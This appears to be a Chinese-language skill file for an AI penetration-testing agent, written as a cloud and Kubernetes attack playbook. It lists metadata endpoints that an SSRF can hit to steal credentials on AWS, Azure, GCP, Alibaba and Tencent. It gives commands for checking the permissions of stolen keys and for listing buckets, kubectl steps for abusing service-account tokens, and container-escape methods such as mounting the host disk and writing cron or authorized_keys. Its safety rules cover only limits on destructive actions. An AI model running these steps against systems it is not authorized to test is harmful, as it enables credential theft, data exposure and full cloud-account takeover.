---
name: cloud-attack-methods
description: 云环境（AWS/Azure/GCP/阿里云/腾讯云）与 K8s 打法——元数据 SSRF、AK/SK 泄露、存储桶、IAM 提权、容器逃逸与服务账号滥用。
---

# 云 / 容器攻击手册

**入口几乎总是同一个**：一个能发 HTTP 请求的地方（SSRF、上传后回显、CI 环境变量、泄露的前端配置）。
拿到云侧的任何凭据，价值通常远高于应用层单个洞。

## 一、元数据服务（SSRF 的第一落点）

| 云 | 地址 | 关键内容 |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | 临时 AK/SK/Token |
| AWS (IMDSv2) | 先 `PUT /latest/api/token` 取 token，再带 `X-aws-ec2-metadata-token` | 同上 |
| Azure | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` 带 `Metadata: true` | 托管身份 token |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` 带 `Metadata-Flavor: Google` | access token |
| 阿里云 | `http://100.100.100.200/latest/meta-data/ram/security-credentials/` | 临时 AK/SK |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` | 临时密钥 |
| K8s | `https://kubernetes.default.svc/api/v1/namespaces/{ns}/secrets` + `/var/run/secrets/kubernetes.io/serviceaccount/token` | 服务账号 token |

**验证标准**：拿到**可用的**凭据（能列资源、能读对象），不是"返回了 200"。

## 二、凭据到手之后（先定权，再动手）

```
# AWS
Bash: AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
Bash: ... aws iam list-attached-user-policies --user-name {u}
Bash: ... aws s3 ls                      # 能列出桶 = 影响面明确
# Azure
Bash: az login --service-principal -u {appid} -p {secret} --tenant {tenant}
Bash: az account list / az role assignment list --assignee {objectId}
# GCP
Bash: gcloud auth activate-service-account --key-file sa.json
Bash: gcloud projects list / gcloud iam roles list
```

**权限定级（决定了这个洞报 critical 还是 high）**：

| 能力 | 影响 |
|---|---|
| 只读单桶 | medium |
| 可写/可删对象 | high |
| 可创建资源（EC2/Lambda/Function） | critical（= 代码执行） |
| `iam:*` / `sts:AssumeRole` | critical（= 全账号接管） |

## 三、存储桶 / 对象存储

```
Bash: curl -s "https://{bucket}.s3.amazonaws.com/?list-type=2" | head -c 2000
Bash: curl -s "https://{bucket}.oss-cn-{region}.aliyuncs.com/?list-type=2"
Bash: curl -s "https://{bucket}.cos.{region}.myqcloud.com/"
```
- 可列目录 → 找备份/源码/凭据，不要只报"桶可列出"。
- 可写 → **只写一个无害的证明文件**（如 `poc-{random}.txt`），不要覆盖已有对象，更不要删。
- 桶名可从 JS、APK、CI 配置、错误页、DNS CNAME 里找。

## 四、K8s

```
Bash: kubectl --token={sa_token} --server=https://{api} --insecure-skip-tls-verify auth can-i --list
Bash: kubectl ... get pods,secrets -A            # 权限够才有输出
```
- `can-i --list` 有 `create pods` → 挂载 hostPath 提权到节点。
- 有 `get secrets` → 读其它服务的凭据，横向到云账号。
- 有 `pods/exec` → 直接进容器，再看 `/var/run/secrets`。

## 五、容器逃逸判据

| 信号 | 检查 | 逃逸方式 |
|---|---|---|
| privileged | `cat /proc/1/status \| grep CapEff`（全 f） | 挂宿主盘 |
| docker.sock | `ls /var/run/docker.sock` | `docker run -v /:/host` |
| hostPath 挂载 | `mount \| grep -v cgroup` | 写宿主 cron/authorized_keys |
| CAP_SYS_ADMIN | `capsh --print` | cgroup release_agent |
| 内核版本旧 | `uname -r` | 已知 CVE（先查，别乱打） |

## 六、写回要求

```
record_fact(
  summary: "SSRF 打到 AWS 元数据，拿到 iam-role/app-role 的临时凭据，权限为 s3:* 且可写 prod-backup 桶",
  detail:  "调用链: /api/fetch?url= → 169.254.169.254（IMDSv1 未禁用）
            凭据: ASIA...（过期 2026-10-27T12:00Z）
            权限: aws s3 ls → 可列 3 个桶；对 prod-backup 有 PutObject（已用 poc-xxx.txt 验证）
            未做: 未尝试删除、未触碰业务数据",
  evidence: "aws sts get-caller-identity → arn:aws:sts::123:assumed-role/app-role/i-0abc",
  confidence: observed,
  capability: ["creds"],
  asset_ids: [ssrf_endpoint_asset]
)
```
**不要**把凭据原文写进 summary（会进报告和通知）；写到 detail 并标注过期时间，
报告正文里脱敏。

## 七、红线

- 只读优先；写操作只写证明文件；**绝不删除、绝不导出业务数据**。
- 不在云控制台做任何"顺手"的变更（改策略、开端口）。
- 云侧操作全部走录制代理/可审计命令，保证事后能复盘。
